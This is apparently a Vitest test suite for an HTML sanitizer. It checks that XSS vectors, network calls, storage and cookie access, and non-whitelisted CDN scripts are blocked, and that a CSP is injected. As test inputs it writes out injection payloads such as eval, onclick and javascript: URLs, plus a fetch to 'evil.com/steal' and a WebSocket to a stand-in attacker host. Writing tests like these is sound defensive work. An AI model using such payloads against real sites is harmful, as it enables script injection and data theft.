/**
 * Enhanced HTML Sanitizer Test Suite
 *
 * Phase 0.3: Comprehensive security testing
 */

import { describe, it, expect } from 'vitest';
import { sanitizeHtmlSync, sanitizeHtml } from '@/shared/lib/upg/html-sanitizer-enhanced';

describe('HTML Sanitizer - XSS Attack Vectors', () => {
  it('should block eval() - direct call', () => {
    const html = '<script>eval("alert(1)")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('eval(');
    expect(result.issues.some(issue => issue.includes('eval'))).toBe(true);
  });

  it('should block eval() - obfuscated with window[]', () => {
    const html = '<script>window["eval"]("alert(1)")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.issues.some(issue => issue.includes('eval'))).toBe(true);
  });

  it('should block Function constructor', () => {
    const html = '<script>new Function("alert(1)")()</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('new Function');
    expect(result.issues.some(issue => issue.includes('Function'))).toBe(true);
  });

  it('should block setTimeout with string', () => {
    const html = '<script>setTimeout("alert(1)", 1000)</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('setTimeout("alert');
    expect(result.issues.some(issue => issue.includes('setTimeout'))).toBe(true);
  });

  it('should block onclick event handler', () => {
    const html = '<button onclick="alert(1)">Click</button>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('onclick=');
    expect(result.issues.some(issue => issue.includes('Event handler'))).toBe(true);
  });

  it('should block javascript: protocol', () => {
    const html = '<a href="javascript:alert(1)">Click</a>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('javascript:');
    expect(result.issues.some(issue => issue.includes('javascript: protocol'))).toBe(true);
  });

  it('should block iframe tags', () => {
    const html = '<iframe src="https://evil.com"></iframe>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('<iframe');
    expect(result.issues.some(issue => issue.includes('iframe'))).toBe(true);
  });

  it('should block document.write', () => {
    const html = '<script>document.write("<script>alert(1)</script>")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('document.write(');
    expect(result.issues.some(issue => issue.includes('document.write'))).toBe(true);
  });
});

describe('HTML Sanitizer - Network Request Blocking', () => {
  it('should block fetch() calls', () => {
    const html = '<script>fetch("https://evil.com/steal")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('fetch(');
    expect(result.issues.some(issue => issue.includes('fetch'))).toBe(true);
  });

  it('should block XMLHttpRequest', () => {
    const html = '<script>new XMLHttpRequest()</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('new XMLHttpRequest');
    expect(result.issues.some(issue => issue.includes('XMLHttpRequest'))).toBe(true);
  });

  it('should block WebSocket', () => {
    const html = '<script>new WebSocket("wss://evil.com")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).not.toContain('new WebSocket');
    expect(result.issues.some(issue => issue.includes('WebSocket'))).toBe(true);
  });
});

describe('HTML Sanitizer - Storage Access Blocking', () => {
  it('should block localStorage access', () => {
    const html = '<script>localStorage.setItem("key", "value")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('STORAGE_BLOCKED');
    expect(result.sanitized).not.toMatch(/\blocalStorage\b/);
    expect(result.issues.some(issue => issue.includes('localStorage'))).toBe(true);
  });

  it('should block sessionStorage access', () => {
    const html = '<script>sessionStorage.setItem("key", "value")</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('STORAGE_BLOCKED');
    expect(result.sanitized).not.toMatch(/\bsessionStorage\b/);
    expect(result.issues.some(issue => issue.includes('sessionStorage'))).toBe(true);
  });

  it('should block document.cookie access', () => {
    const html = '<script>document.cookie = "session=stolen"</script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('COOKIE_BLOCKED');
    expect(result.sanitized).not.toMatch(/document\s*\.\s*cookie/);
    expect(result.issues.some(issue => issue.includes('cookie'))).toBe(true);
  });
});

describe('HTML Sanitizer - CDN Whitelist', () => {
  it('should allow Three.js r134 from cdn.jsdelivr.net', () => {
    const html = '<script src="https://cdn.jsdelivr.net/npm/three@0.134.0/build/three.min.js"></script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('three@0.134.0');
  });

  it('should allow KaTeX 0.16.9 from cdn.jsdelivr.net', () => {
    const html = '<script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('katex@0.16.9');
  });

  it('should block Three.js wrong version', () => {
    const html = '<script src="https://cdn.jsdelivr.net/npm/three@0.150.0/build/three.min.js"></script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('BLOCKED_SCRIPT');
    expect(result.sanitized).not.toMatch(/three@0\.150\.0/);
  });

  it('should block non-whitelisted CDN', () => {
    const html = '<script src="https://evil-cdn.com/malicious.js"></script>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('BLOCKED_SCRIPT');
    expect(result.sanitized).not.toMatch(/evil-cdn\.com/);
  });
});

describe('HTML Sanitizer - CSP Injection', () => {
  it('should inject CSP meta tag', () => {
    const html = '<!DOCTYPE html><html><head></head><body></body></html>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('Content-Security-Policy');
  });

  it('should inject CSP with correct directives', () => {
    const html = '<!DOCTYPE html><html><head></head><body></body></html>';
    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain("connect-src 'none'");
    expect(result.sanitized).toContain("frame-src 'none'");
    expect(result.sanitized).toContain("object-src 'none'");
  });
});

describe('HTML Sanitizer - Performance', () => {
  it('should sanitize 10KB HTML in < 200ms', async () => {
    const largeHtml = `<!DOCTYPE html><html><head></head><body>${'<div>test</div>'.repeat(500)}</body></html>`;

    const startTime = performance.now();
    await sanitizeHtml(largeHtml);
    const elapsed = performance.now() - startTime;

    expect(elapsed).toBeLessThan(200);
  });

  it('should use cache for repeated sanitization', async () => {
    const html = '<!DOCTYPE html><html><head></head><body></body></html>';

    const result1 = await sanitizeHtml(html);
    const result2 = await sanitizeHtml(html);

    // Verify results are identical (cache hit)
    expect(result2.sanitized).toBe(result1.sanitized);
    expect(result2.passed).toBe(result1.passed);
    expect(result2.issues).toEqual(result1.issues);

    // Second call should be very fast (< 1ms)
    expect(result2.performanceMs).toBeLessThan(1);
  });
});

describe('HTML Sanitizer - Safe Three.js Code', () => {
  it('should allow safe Three.js scene code', () => {
    const html = `
<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.jsdelivr.net/npm/three@0.134.0/build/three.min.js"></script>
</head>
<body>
  <script>
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer();
    renderer.setSize(window.innerWidth, window.innerHeight);
    document.body.appendChild(renderer.domElement);

    const geometry = new THREE.BoxGeometry();
    const material = new THREE.MeshBasicMaterial({ color: 0x00ff00 });
    const cube = new THREE.Mesh(geometry, material);
    scene.add(cube);

    camera.position.z = 5;

    function animate() {
      requestAnimationFrame(animate);
      cube.rotation.x += 0.01;
      cube.rotation.y += 0.01;
      renderer.render(scene, camera);
    }
    animate();
  </script>
</body>
</html>
    `;

    const result = sanitizeHtmlSync(html);
    expect(result.sanitized).toContain('THREE.Scene');
    expect(result.sanitized).toContain('requestAnimationFrame');
    expect(result.sanitized).toContain('renderer.render');

    const criticalIssues = result.issues.filter(issue => issue.includes('[critical]'));
    expect(criticalIssues.length).toBe(0);
  });
});
